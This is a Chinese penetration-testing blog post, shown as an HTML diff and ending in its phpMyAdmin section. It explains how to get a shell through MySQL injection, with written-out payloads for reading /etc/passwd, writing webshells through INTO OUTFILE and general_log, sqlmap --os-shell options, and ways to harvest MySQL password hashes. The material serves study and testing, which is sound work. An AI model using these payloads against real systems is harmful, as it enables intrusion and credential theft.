@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="渗透测试–shell获取sql注入获取shell联合注入读写shell读文件1、对文件有写权限 2、文件大小小于max_allowed_packet 3、secure_file_priv的值为空，该配置选项在my.ini文件中。 4、当前数据库用户要有FILE权限 1&#39; and 1&#x3D;2 union all select load_file(&#39;&#x2F;etc&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试--shell获取">
+<meta property="og:url" content="http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/index.html">
+<meta property="og:site_name" content="steady&#39;s blog">
+<meta property="og:description" content="渗透测试–shell获取sql注入获取shell联合注入读写shell读文件1、对文件有写权限 2、文件大小小于max_allowed_packet 3、secure_file_priv的值为空，该配置选项在my.ini文件中。 4、当前数据库用户要有FILE权限 1&#39; and 1&#x3D;2 union all select load_file(&#39;&#x2F;etc&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-10-31T20:03:26.000Z">
+<meta property="article:modified_time" content="2020-12-02T07:37:03.626Z">
+<meta property="article:author" content="steady">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>渗透测试--shell获取</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="steady's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&text=渗透测试--shell获取"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&is_video=false&description=渗透测试--shell获取"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试--shell获取&body=Check out this article: http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&title=渗透测试--shell获取"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&name=渗透测试--shell获取&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/&t=渗透测试--shell获取"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%93shell%E8%8E%B7%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">渗透测试–shell获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">联合注入读写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99shell"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">报错注入读写shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">1.1.1.2.2.</span> <span class="toc-text">判断文件是否存在</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%8B%BFshell"><span class="toc-number">1.1.2.</span> <span class="toc-text">日志拿shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E9%85%8D%E5%90%88%E6%97%A5%E5%BF%97%E4%B8%8A%E4%BC%A0shell"><span class="toc-number">1.1.3.</span> <span class="toc-text">堆叠注入配合日志上传shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">sqlmap常见使用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E5%AF%86%E7%A0%81%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.5.</span> <span class="toc-text">mysql密码的获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpadmin%E5%90%8E%E5%8F%B0%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.</span> <span class="toc-text">phpadmin后台获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%AF%BC%E5%87%BAwebshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用数据库表导出webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E8%AF%AD%E5%8F%A5%E5%AF%BC%E5%87%BAwebshell"><span class="toc-number">1.2.2.</span> <span class="toc-text">常规语句导出webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E7%88%86%E5%87%BAshell"><span class="toc-number">1.2.3.</span> <span class="toc-text">日志文件爆出shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#slow-query-log-file%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.4.</span> <span class="toc-text">slow_query_log_file获取shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87WAF"><span class="toc-number">1.2.5.</span> <span class="toc-text">绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E5%A4%96%E9%93%BE"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">开启外链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">十六进制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99"><span class="toc-number">1.2.6.</span> <span class="toc-text">常见报错</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透测试--shell获取
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">steady</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-10-31T20:03:26.000Z" itemprop="datePublished">2020-11-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="渗透测试–shell获取"><a href="#渗透测试–shell获取" class="headerlink" title="渗透测试–shell获取"></a>渗透测试–shell获取</h1><h2 id="sql注入获取shell"><a href="#sql注入获取shell" class="headerlink" title="sql注入获取shell"></a>sql注入获取shell</h2><h3 id="联合注入读写shell"><a href="#联合注入读写shell" class="headerlink" title="联合注入读写shell"></a>联合注入读写shell</h3><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>1、对文件有写权限</p>
+<p>2、文件大小小于<code>max_allowed_packet</code></p>
+<p>3、<code>secure_file_priv</code>的值为空，该配置选项在my.ini文件中。</p>
+<p>4、当前数据库用户要有FILE权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;2 union all select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)--+</span><br></pre></td></tr></table></figure>
+
+<p>常见变形</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; UNION SELECT 1,2,load_file(char(99,58,47,98,111,111,116,46,105,110,105))--+ </span><br><span class="line">&#x2F;&#x2F;通过char()函数将ascii十进制形式转为字符形式，可绕过引号过滤</span><br><span class="line">?id&#x3D;-1&#39; UNION SELECT 1,2,load_file(0x633a2f626f6f742e696e69)                &#x2F;&#x2F;十六进制形式</span><br></pre></td></tr></table></figure>
+
+<h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>1、对文件有写入权限</p>
+<p>2、当前数据库用户要有FILE权限</p>
+<p>3、<code>secure_file_priv</code>的值为空，或者在指定的目录下面</p>
+<p>测试数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    371</span><br><span class="line">Current database: test</span><br><span class="line"></span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.05 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>select 内容 into outfile 文件目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;2 union all select &#39;一句话木马&#39; into outfile &#39;&#x2F;tmp&#x2F;blablabla&#39;--+</span><br><span class="line">&#39; and 1&#x3D;2 union all select 十六进制 into outfile &#39;&#x2F;tmp&#x2F;blablabla&#39;--+</span><br><span class="line">&#39; and 1&#x3D;2 union all select 十六进制 into dumpfile &#39;&#x2F;tmp&#x2F;blablabla&#39;  </span><br></pre></td></tr></table></figure>
+
+<p>区别：</p>
+<p>into outfile 可以导出表中的每一行数据，不可以导出二进制数据，会在行末端写入新行，会转义换行符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math into outfile  &quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;3.txt&quot;;</span><br><span class="line">Query OK, 7 rows affected (0.00 sec)</span><br><span class="line">1	gongxinao</span><br><span class="line">1	李明</span><br><span class="line">1	gongxinao</span><br><span class="line">1	gongxinao</span><br><span class="line">25	gongcheng</span><br><span class="line">3	chengxian</span><br><span class="line">25	gongcheng</span><br></pre></td></tr></table></figure>
+
+<p>into dumpfile只能导出一行数据，可以导出二进制数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math into dumpfile  &quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;3.txt&quot;;</span><br><span class="line">ERROR 1172 (42000): Result consisted of more than one row</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>FIELDS TERMINATED BY</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id &#x3D; 1 into outfile &#39;D:&#x2F;1.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D; 1 into outfile &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br></pre></td></tr></table></figure>
+
+<p>1.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&lt;?php phpinfo();?&gt;gongxinao</span><br><span class="line">1&lt;?php phpinfo();?&gt;李明</span><br><span class="line">1&lt;?php phpinfo();?&gt;gongxinao</span><br><span class="line">1&lt;?php phpinfo();?&gt;gongxinao</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>lines terminated by</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM user WHERE id &#x3D; 1 into outfile &#39;D:&#x2F;1.php&#39; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>lines starting by</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM user WHERE id &#x3D; 1 into outfile &#39;D:&#x2F;2.php&#39; LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from math where id &gt; 2 into outfile &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.php&#39; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e;</span><br></pre></td></tr></table></figure>
+
+<p>1.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25	gongcheng&lt;?php phpinfo();?&gt;3	chengxian&lt;?php phpinfo();?&gt;25	gongcheng&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>FIELDS TERMINATED BY 原理为在输出数据的每个字段之间插入webshell内容，如果select返回的只有一个字</p>
+<p>段，则写入的文件不包含webshell内容。</p>
+<p>LINES TERMINATED BY和LINES STARTING BY 原理为在输出每条记录的结尾或开始处插入webshell内容，只查询一个字段也可以写入webshell内容，更为通用。</p>
+</li>
+</ul>
+<h5 id="报错注入读写shell"><a href="#报错注入读写shell" class="headerlink" title="报错注入读写shell"></a>报错注入读写shell</h5><p>报错注入读文件内容，有时候会由于报错长度受限或者文件编码问题，推荐采用hex编码方式分段读取文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user  where username &#x3D; &#39;&#39; and updatexml(0,concat(0x7e(LOAD_FILE(&#39;D:&#x2F;1.php&#39;)),0x7e),0)</span><br><span class="line"></span><br><span class="line">select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE(&#39;D:&#x2F;1.php&#39;))),0x7e)))</span><br></pre></td></tr></table></figure>
+
+<h5 id="判断文件是否存在"><a href="#判断文件是否存在" class="headerlink" title="判断文件是否存在"></a>判断文件是否存在</h5><p>load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在</p>
+<h3 id="日志拿shell"><a href="#日志拿shell" class="headerlink" title="日志拿shell"></a>日志拿shell</h3><p>查看日志文件是否开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%general%&quot;;</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| Variable_name    | Value                               |</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| general_log      | OFF                                 |</span><br><span class="line">| general_log_file | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ip-172-31-31-147.log |</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">2 rows in set (0.16 sec)</span><br></pre></td></tr></table></figure>
+
+<p>开启日志文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global general_log&#x3D;&#39;on&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt; show variables like &quot;%general%&quot;;</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| Variable_name    | Value                               |</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| general_log      | ON                                  |</span><br><span class="line">| general_log_file | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ip-172-31-31-147.log |</span><br><span class="line">+------------------+-------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>修改日志文件路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.php&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>插入一句话shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="堆叠注入配合日志上传shell"><a href="#堆叠注入配合日志上传shell" class="headerlink" title="堆叠注入配合日志上传shell"></a>堆叠注入配合日志上传shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\wwwroot\\web\\shell.php&#39;;#</span><br><span class="line">id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;#</span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlmap常见使用参数"><a href="#sqlmap常见使用参数" class="headerlink" title="sqlmap常见使用参数"></a>sqlmap常见使用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-v 显示pyload</span><br><span class="line">--os-shell</span><br><span class="line">--sql-shell</span><br><span class="line">--is-dba</span><br><span class="line">--os-cmd&#x3D;</span><br><span class="line">--data 以post参数提交数据</span><br><span class="line">--user-agent&#x3D;“” 随机浏览器头</span><br><span class="line">-search -C  username,password,admin 快速搜索数据库中的字段</span><br><span class="line">sqlmap -u &quot;url&quot; --file-write&#x3D;本地文件路径 --file-dest&#x3D;网站的绝对路径 &#x2F;&#x2F;上传webshell用，需要dba权限</span><br><span class="line">sqlmap -u &quot;url&quot; –file-read&#x3D; &#x2F;&#x2F;这个读取的文件会存在本地的结果目录，请认真看提示</span><br><span class="line">sqlmap -u &quot;url&quot; --os-cmd &quot;cmd&quot;  &#x2F;&#x2F;执行cmd代表的命令，如cd C:&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql密码的获取"><a href="#mysql密码的获取" class="headerlink" title="mysql密码的获取"></a>mysql密码的获取</h3><ul>
+<li><p>常见CMS数据库配置文件</p>
+<p>比如：Discuz的config/config_global_default.php、config /config_ucenter.php、config.inc.php。</p>
+</li>
+<li><p>对于操作系统，linux会存在于./root/.mysql_history、./root/.bash_history文件。</p>
+</li>
+<li><p>文件查找</p>
+<p>有关用户一共有三个文件即user.frm、user.MYD和 user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。在有权限的情况下，我们可以将User.frm、user.myd和User.myi三个文件下载到本地，通过本地的mysql环境直接读取user表中的数据。当然也可使用文本编辑器将user.MYD打开将root账号的密码复制出来到到cmd5.com进行查询和破解。</p>
+</li>
+<li><p>直接使用命令查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. select user,password from mysql.user;</span><br><span class="line">2. select user,password from mysql.user where user &#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<h2 id="phpadmin后台获取shell"><a href="#phpadmin后台获取shell" class="headerlink" title="phpadmin后台获取shell"></a>phpadmin后台获取shell</h2><h3 id="利用数据库表导出webshell"><a href="#利用数据库表导出webshell" class="headerlink" title="利用数据库表导出webshell"></a>利用数据库表导出webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE webshell (content text NOT <span class="literal">NULL</span>);</span><br><span class="line">Insert INTO webshell (content) VALUES(<span class="string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span>);</span><br><span class="line">select content <span class="keyword">from</span> webshell into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">DROP TABLE <span class="keyword">IF</span> EXISTS `webshell`;</span><br></pre></td></tr></table></figure>
+
